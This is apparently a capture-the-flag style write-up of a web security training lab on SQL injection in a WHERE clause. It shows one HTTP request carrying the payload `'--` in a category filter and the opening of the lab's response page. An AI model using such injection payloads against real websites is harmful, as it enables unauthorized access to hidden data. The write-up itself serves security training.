# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Checking vulnerability with `'--` to ensure sql injection works.
**Request**
```http
GET /filter?category=Corporate+gifts'-- HTTP/2  
Host: 0afc008503aee37e8311923500bd001d.web-security-academy.net  
Cookie: session=[REDACTED]  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0afc008503aee37e8311923500bd001d.web-security-academy.net/filter?category=Corporate+gifts
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```


**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5297

<!DOCTYPE html>
<html>
    <!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>
            SQL injection vulnerability in WHERE clause allowing retrieval of
            hidden data
        </title>
    </head>
    <!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js">
        </script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class="academyLabBanner">
[...remaining response omitted...]
```

---
